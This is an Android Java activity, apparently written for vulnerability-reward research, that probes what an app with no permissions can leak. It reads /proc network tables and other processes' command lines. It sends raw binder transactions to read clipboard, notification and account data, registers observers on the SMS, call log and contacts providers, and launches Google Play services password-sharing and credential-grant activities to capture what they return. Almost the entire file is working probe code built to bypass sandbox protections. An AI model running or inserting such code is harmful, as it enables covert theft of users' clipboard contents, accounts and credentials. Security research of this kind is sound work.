package com.vrp.zeroperm;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Parcel;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.lang.reflect.Method;

public class SysLeakProbeActivity extends Activity {
    private static final String T = "SYSLEAK";

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        Log.w(T, "=== System Leak Probe ===");
        Log.w(T, "UID=" + android.os.Process.myUid() + " PID=" + android.os.Process.myPid());

        probeProcNet();
        probeProcMisc();
        probeServiceManager();
        probeContentObservers();
        probeActivityResults();

        Log.w(T, "=== PROBE COMPLETE ===");
    }

    private void probeProcNet() {
        Log.w(T, "--- /proc/net access ---");
        String[] files = {
            "/proc/net/tcp", "/proc/net/tcp6",
            "/proc/net/udp", "/proc/net/udp6",
            "/proc/net/unix", "/proc/net/arp",
            "/proc/net/route", "/proc/net/if_inet6",
            "/proc/net/dev", "/proc/net/wireless",
        };

        int myUid = android.os.Process.myUid();
        for (String path : files) {
            try {
                BufferedReader br = new BufferedReader(new FileReader(path));
                String header = br.readLine();
                int total = 0;
                int foreign = 0;
                String line;
                while ((line = br.readLine()) != null) {
                    total++;
                    if (!line.contains(String.valueOf(myUid)) && !line.contains("uid")) {
                        foreign++;
                    }
                }
                br.close();
                if (total > 0) {
                    Log.w(T, "[+] " + path + ": " + total + " entries, " + foreign + " foreign-uid");
                    if (foreign > 0) {
                        Log.w(T, "[!!!] FOREIGN UID CONNECTIONS VISIBLE in " + path);
                        br = new BufferedReader(new FileReader(path));
                        br.readLine();
                        int shown = 0;
                        while ((line = br.readLine()) != null && shown < 5) {
                            Log.w(T, "  " + line.trim());
                            shown++;
                        }
                        br.close();
                    }
                }
            } catch (SecurityException se) {
                Log.w(T, "[-] " + path + " SECURITY: " + se.getMessage());
            } catch (Exception e) {
                // Permission denied is normal
            }
        }

        // Check /proc/net/fib_trie for IP addresses
        try {
            BufferedReader br = new BufferedReader(new FileReader("/proc/net/fib_trie"));
            String line;
            while ((line = br.readLine()) != null) {
                if (line.contains("/32 host")) {
                    Log.w(T, "[+] fib_trie host: " + line.trim());
                }
            }
            br.close();
        } catch (Exception e) {}
    }

    private void probeProcMisc() {
        Log.w(T, "--- /proc misc access ---");

        // Try to read other processes' info
        File procDir = new File("/proc");
        String[] procs = procDir.list();
        int readable = 0;
        if (procs != null) {
            for (String p : procs) {
                if (p.matches("\\d+")) {
                    int pid = Integer.parseInt(p);
                    if (pid == android.os.Process.myPid()) continue;
                    try {
                        BufferedReader br = new BufferedReader(new FileReader("/proc/" + pid + "/cmdline"));
                        String cmd = br.readLine();
                        br.close();
                        if (cmd != null && cmd.length() > 0) {
                            readable++;
                            if (readable <= 5) {
                                String cleanCmd = cmd.replace('\0', ' ').trim();
                                Log.w(T, "[+] /proc/" + pid + "/cmdline: " + cleanCmd);
                            }
                        }
                    } catch (Exception e) {}
                }
            }
        }
        Log.w(T, "Readable process cmdlines: " + readable);
        if (readable > 10) {
            Log.w(T, "[!!!] CAN READ OTHER PROCESS NAMES — process enumeration");
        }

        // Check /proc/version
        try {
            BufferedReader br = new BufferedReader(new FileReader("/proc/version"));
            Log.w(T, "[+] /proc/version: " + br.readLine());
            br.close();
        } catch (Exception e) {}

        // Check /proc/meminfo
        try {
            BufferedReader br = new BufferedReader(new FileReader("/proc/meminfo"));
            Log.w(T, "[+] MemTotal: " + br.readLine());
            br.close();
        } catch (Exception e) {}

        // /proc/cpuinfo
        try {
            BufferedReader br = new BufferedReader(new FileReader("/proc/cpuinfo"));
            String l;
            while ((l = br.readLine()) != null) {
                if (l.startsWith("Hardware") || l.startsWith("Serial")) {
                    Log.w(T, "[+] cpuinfo: " + l);
                }
            }
            br.close();
        } catch (Exception e) {}
    }

    private void probeServiceManager() {
        Log.w(T, "--- ServiceManager direct access ---");

        // Try to get binder services directly via ServiceManager
        String[] services = {
            "phone", "isms", "telecom", "account",
            "notification", "clipboard", "user",
            "device_policy", "accessibility", "backup",
            "location", "wifi", "bluetooth_manager",
            "package", "activity", "alarm",
            "credential", "autofill", "trust",
        };

        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method getService = sm.getMethod("getService", String.class);
            Method listServices = sm.getMethod("listServices");

            // List all services
            String[] allServices = (String[]) listServices.invoke(null);
            Log.w(T, "Total system services: " + (allServices != null ? allServices.length : 0));

            for (String svc : services) {
                try {
                    IBinder binder = (IBinder) getService.invoke(null, svc);
                    if (binder != null) {
                        String desc = binder.getInterfaceDescriptor();
                        Log.w(T, "[+] " + svc + ": " + desc);

                        // Try to call methods on sensitive services
                        if ("clipboard".equals(svc)) {
                            tryClipboardRead(binder, desc);
                        } else if ("notification".equals(svc)) {
                            tryNotificationRead(binder, desc);
                        } else if ("account".equals(svc)) {
                            tryAccountRead(binder, desc);
                        }
                    }
                } catch (Exception e) {}
            }
        } catch (Exception e) {
            Log.w(T, "ServiceManager: " + e.getClass().getSimpleName());
        }
    }

    private void tryClipboardRead(IBinder binder, String desc) {
        // IClipboard: TX 2 = getPrimaryClip(String callingPackage, String attributionTag, int userId)
        for (int tx = 1; tx <= 5; tx++) {
            try {
                Parcel d = Parcel.obtain();
                Parcel r = Parcel.obtain();
                d.writeInterfaceToken(desc);
                d.writeString(getPackageName());
                d.writeString(null);
                d.writeInt(0);
                d.writeInt(0);
                binder.transact(tx, d, r, 0);
                r.setDataPosition(0);
                int exc = r.readInt();
                if (exc == 0 && r.dataAvail() > 8) {
                    Log.w(T, "[!!!] clipboard TX" + tx + " returned data avail=" + r.dataAvail());
                    dumpStrings(r, "clipboard_TX" + tx);
                }
                d.recycle();
                r.recycle();
            } catch (SecurityException se) {
                Log.w(T, "  clipboard TX" + tx + " SECURITY");
                break;
            } catch (Exception e) {}
        }
    }

    private void tryNotificationRead(IBinder binder, String desc) {
        // INotificationManager: TX 26 = getActiveNotifications (on some versions)
        for (int tx : new int[]{15, 16, 26, 27, 35}) {
            try {
                Parcel d = Parcel.obtain();
                Parcel r = Parcel.obtain();
                d.writeInterfaceToken(desc);
                d.writeString(getPackageName());
                binder.transact(tx, d, r, 0);
                r.setDataPosition(0);
                int exc = r.readInt();
                if (exc == 0 && r.dataAvail() > 8) {
                    Log.w(T, "[!!!] notification TX" + tx + " returned data avail=" + r.dataAvail());
                    dumpStrings(r, "notif_TX" + tx);
                }
                d.recycle();
                r.recycle();
            } catch (SecurityException se) {
                break;
            } catch (Exception e) {}
        }
    }

    private void tryAccountRead(IBinder binder, String desc) {
        // IAccountManager: TX 4 = getAccounts, TX 5 = getAccountsByType
        for (int tx : new int[]{4, 5, 6, 7}) {
            try {
                Parcel d = Parcel.obtain();
                Parcel r = Parcel.obtain();
                d.writeInterfaceToken(desc);
                if (tx == 5) d.writeString("com.google");
                else d.writeInt(0);
                d.writeString(getPackageName());
                d.writeString(null);
                binder.transact(tx, d, r, 0);
                r.setDataPosition(0);
                int exc = r.readInt();
                if (exc == 0 && r.dataAvail() > 8) {
                    Log.w(T, "[!!!] account TX" + tx + " returned data avail=" + r.dataAvail());
                    dumpStrings(r, "account_TX" + tx);
                }
                d.recycle();
                r.recycle();
            } catch (SecurityException se) {
                Log.w(T, "  account TX" + tx + " SECURITY");
                break;
            } catch (Exception e) {}
        }
    }

    private void probeContentObservers() {
        Log.w(T, "--- Content Observer Registration ---");

        // Register observers for sensitive URIs — even if we can't query, we might get change notifications
        Uri[] uris = {
            Uri.parse("content://sms"),
            Uri.parse("content://call_log/calls"),
            Uri.parse("content://com.android.contacts/contacts"),
            Uri.parse("content://com.android.calendar/events"),
            Uri.parse("content://media/external/images/media"),
        };

        Handler handler = new Handler(Looper.getMainLooper());
        for (Uri uri : uris) {
            try {
                getContentResolver().registerContentObserver(uri, true, new ContentObserver(handler) {
                    @Override
                    public void onChange(boolean selfChange, Uri changeUri) {
                        Log.w(T, "[!!!] CONTENT CHANGE DETECTED: " + changeUri);
                    }
                });
                Log.w(T, "[+] Observer registered for: " + uri);
            } catch (SecurityException se) {
                Log.w(T, "[-] Observer BLOCKED for: " + uri);
            } catch (Exception e) {
                Log.w(T, "[-] Observer error for " + uri + ": " + e.getClass().getSimpleName());
            }
        }
    }

    private void probeActivityResults() {
        Log.w(T, "--- Activity Result Probes ---");

        // Test SharePasswordsActivity from zero-perm app
        try {
            Intent i = new Intent("com.google.android.gms.auth.api.credentials.SHARE_PASSWORDS_WITH_AI_AGENT");
            i.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.auth.api.credentials.sharepasswordwithaiagent.ui.SharePasswordsActivity"));
            startActivityForResult(i, 200);
            Log.w(T, "[+] SharePasswordsActivity launched");
        } catch (Exception e) {
            Log.w(T, "[-] SharePasswordsActivity: " + e.getClass().getSimpleName() + ": " +
                    (e.getMessage() != null ? e.getMessage().substring(0, Math.min(e.getMessage().length(), 100)) : ""));
        }

        // Test GrantCredentialsWithAclActivity
        try {
            Intent i = new Intent("com.google.android.gms.auth.uiflows.consent.GRANT_CREDENTIALS");
            i.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.auth.uiflows.consent.GrantCredentialsWithAclActivity"));
            startActivityForResult(i, 201);
            Log.w(T, "[+] GrantCredentialsWithAclActivity launched");
        } catch (Exception e) {
            Log.w(T, "[-] GrantCredentials: " + e.getClass().getSimpleName());
        }

        // Test PlacePickerActivity — might return location
        try {
            Intent i = new Intent("com.google.android.gms.location.places.ui.PICK_PLACE");
            i.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.location.places.ui.placepicker.PlacePickerActivity"));
            startActivityForResult(i, 202);
            Log.w(T, "[+] PlacePickerActivity launched");
        } catch (Exception e) {
            Log.w(T, "[-] PlacePicker: " + e.getClass().getSimpleName());
        }
    }

    @Override
    protected void onActivityResult(int req, int res, Intent data) {
        super.onActivityResult(req, res, data);
        Log.w(T, "[RESULT] req=" + req + " res=" + res);
        if (data != null) {
            Log.w(T, "[!!!] DATA from req=" + req);
            if (data.getData() != null) Log.w(T, "  URI: " + data.getData());
            if (data.getExtras() != null) {
                for (String key : data.getExtras().keySet()) {
                    Object val = data.getExtras().get(key);
                    Log.w(T, "  " + key + " = " + (val != null ? val.toString().substring(0, Math.min(val.toString().length(), 200)) : "null"));
                }
            }
        }
    }

    private void dumpStrings(Parcel p, String label) {
        int saved = p.dataPosition();
        try {
            p.setDataPosition(0);
            byte[] raw = p.marshall();
            StringBuilder sb = new StringBuilder();
            for (byte b : raw) {
                if (b >= 32 && b < 127) sb.append((char) b);
                else {
                    if (sb.length() >= 4) {
                        Log.w(T, "  " + label + " STR: " + sb.toString().substring(0, Math.min(sb.length(), 150)));
                    }
                    sb.setLength(0);
                }
            }
            if (sb.length() >= 4) Log.w(T, "  " + label + " STR: " + sb);
        } catch (Exception e) {}
        p.setDataPosition(saved);
    }
}
